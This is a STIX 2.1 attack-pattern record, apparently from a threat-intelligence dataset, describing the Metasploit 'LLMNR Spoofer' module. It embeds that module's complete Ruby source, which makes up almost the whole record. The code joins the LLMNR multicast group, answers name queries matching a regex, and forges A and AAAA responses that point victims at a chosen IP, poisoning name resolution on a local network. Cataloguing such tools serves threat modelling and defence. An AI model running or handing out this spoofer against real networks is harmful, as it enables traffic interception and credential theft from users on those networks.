{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aaf9ff3b-40de-4d29-aa37-69670a111479",
    "created": "2024-08-14T16:32:54.996839Z",
    "modified": "2024-08-14T16:32:54.996843Z",
    "name": "LLMNR Spoofer",
    "description": " LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/llmnr/llmnr_response.rb",
            "external_id": "llmnr_response.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.ietf.org/rfc/rfc4795.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'socket'\nrequire 'ipaddr'\nrequire 'net/dns'\n\nclass MetasploitModule < Msf::Auxiliary\n\ninclude Msf::Exploit::Capture\n\nattr_accessor :sock, :thread\n\n\n  def initialize\n    super(\n      'Name'        => 'LLMNR Spoofer',\n      'Description' => %q{\n          LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to\n          resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests\n          sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address.\n      },\n      'Author'     => [ 'Robin Francois <rof[at]navixia.com>' ],\n      'License'    => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'URL', 'http://www.ietf.org/rfc/rfc4795.txt' ]\n        ],\n\n        'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run LLMNR spoofing service' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service'\n    )\n\n    register_options([\n      OptAddress.new('SPOOFIP', [ true, \"IP address with which to poison responses\", \"\"]),\n      OptRegexp.new('REGEX', [ true, \"Regex applied to the LLMNR Name to determine if spoofed reply is sent\", '.*']),\n      OptInt.new('TTL', [ false, \"Time To Live for the spoofed response\", 30]),\n    ])\n\n    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')\n    self.thread = nil\n    self.sock = nil\n  end\n\n  def dispatch_request(packet, rhost, src_port)\n    rhost = ::IPAddr.new(rhost)\n\n    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped\n    # addr like \"::ffff:192.168.0.1\" when the interface we're listening\n    # on has an IPv6 address. Convert it to just the v4 addr\n    if rhost.ipv4_mapped?\n      rhost = rhost.native\n    end\n\n    dns_pkt = ::Net::DNS::Packet.parse(packet)\n    spoof = ::IPAddr.new(datastore['SPOOFIP'])\n\n    # Turn this packet into a response\n    dns_pkt.header.qr = 1\n\n    dns_pkt.question.each do |question|\n      name = question.qName\n      unless name =~ /#{datastore['REGEX']}/i\n        vprint_status(\"#{rhost.to_s.ljust 16} llmnr - #{name} did not match REGEX \\\"#{datastore['REGEX']}\\\"\")\n        next\n      end\n\n      if should_print_reply?(name)\n        print_good(\"#{rhost.to_s.ljust 16} llmnr - #{name} matches regex, responding with #{datastore['SPOOFIP']}\")\n      end\n\n      # qType is not a Integer, so to compare it with `case` we have to\n      # convert it\n      case question.qType.to_i\n      when ::Net::DNS::A\n        dns_pkt.answer << ::Net::DNS::RR::A.new(\n          :name => name,\n          :ttl => datastore['TTL'],\n          :cls => ::Net::DNS::IN,\n          :type => ::Net::DNS::A,\n          :address => spoof.to_s\n        )\n      when ::Net::DNS::AAAA\n        dns_pkt.answer << ::Net::DNS::RR::AAAA.new(\n          :name => name,\n          :ttl => datastore['TTL'],\n          :cls => ::Net::DNS::IN,\n          :type => ::Net::DNS::AAAA,\n          :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s\n        )\n      when ::Net::DNS::ANY\n        # For ANY queries, respond with both an A record as well as an AAAA.\n        dns_pkt.answer << ::Net::DNS::RR::A.new(\n          :name => name,\n          :ttl => datastore['TTL'],\n          :cls => ::Net::DNS::IN,\n          :type => ::Net::DNS::A,\n          :address => spoof.to_s\n        )\n        dns_pkt.answer << ::Net::DNS::RR::AAAA.new(\n          :name => name,\n          :ttl => datastore['TTL'],\n          :cls => ::Net::DNS::IN,\n          :type => ::Net::DNS::AAAA,\n          :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s\n        )\n      when ::Net::DNS::PTR\n        # Sometimes PTR queries are received. We will silently ignore them.\n        next\n      else\n        print_warning(\"#{rhost.to_s.ljust 16} llmnr - Unknown RR type (#{question.qType.to_i}), this shouldn't happen. Skipping\")\n        next\n      end\n    end\n\n    # If we didn't find anything we want to spoof, don't send any\n    # packets\n    return if dns_pkt.answer.empty?\n\n    udp = ::PacketFu::UDPHeader.new(\n      :udp_src => 5355,\n      :udp_dst => src_port,\n      :body => dns_pkt.data\n    )\n    udp.udp_recalc\n    if rhost.ipv4?\n      ip_pkt = ::PacketFu::IPPacket.new(\n        :ip_src => spoof.hton,\n        :ip_dst => rhost.hton,\n        :ip_proto => 0x11, # UDP\n        :body => udp\n      )\n    elsif rhost.ipv6?\n      ip_pkt = ::PacketFu::IPv6Packet.new(\n        :ipv6_src => spoof.hton,\n        :ipv6_dst => rhost.hton,\n        :ip_proto => 0x11, # UDP\n        :body => udp\n      )\n    else\n      # Should never get here\n      print_error(\"IP version is not 4 or 6. Failed to parse?\")\n      return\n    end\n    ip_pkt.recalc\n\n    capture_sendto(ip_pkt, rhost.to_s, true)\n  end\n\n  def monitor_socket\n    while true\n      rds = [self.sock]\n      wds = []\n      eds = [self.sock]\n\n      r,_,_ = ::IO.select(rds,wds,eds,0.25)\n\n      if (r != nil and r[0] == self.sock)\n        packet, host, port = self.sock.recvfrom(65535)\n        dispatch_request(packet, host, port)\n      end\n    end\n  end\n\n\n  # Don't spam with success, just throttle to every 10 seconds\n  # per host\n  def should_print_reply?(host)\n    @notified_times ||= {}\n    now = Time.now.utc\n    @notified_times[host] ||= now\n    last_notified = now - @notified_times[host]\n    if last_notified == 0 or last_notified > 10\n      @notified_times[host] = now\n    else\n      false\n    end\n  end\n\n  def run\n    check_pcaprub_loaded()\n    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround\n\n    # Avoid receiving extraneous traffic on our send socket\n    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})\n\n    # Multicast Address for LLMNR\n    multicast_addr = ::IPAddr.new(\"224.0.0.252\")\n\n    # The bind address here will determine which interface we receive\n    # multicast packets from. If the address is INADDR_ANY, we get them\n    # from all interfaces, so try to restrict if we can, but fall back\n    # if we can't\n    bind_addr = get_ipv4_addr(datastore[\"INTERFACE\"]) rescue \"0.0.0.0\"\n\n    optval = multicast_addr.hton + ::IPAddr.new(bind_addr).hton\n    self.sock = Rex::Socket.create_udp(\n      # This must be INADDR_ANY to receive multicast packets\n      'LocalHost' => \"0.0.0.0\",\n      'LocalPort' => 5355,\n      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }\n    )\n    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)\n    self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)\n\n    self.thread = Rex::ThreadFactory.spawn(\"LLMNRServerMonitor\", false) {\n      monitor_socket\n    }\n\n    print_status(\"LLMNR Spoofer started. Listening for LLMNR requests with REGEX \\\"#{datastore['REGEX']}\\\" ...\")\n\n    add_socket(self.sock)\n\n    self.thread.join\n  end\n\n  def cleanup\n    if self.thread and self.thread.alive?\n      self.thread.kill\n      self.thread = nil\n    end\n    self.sock.close\n    close_pcap\n  end\nend\n"
}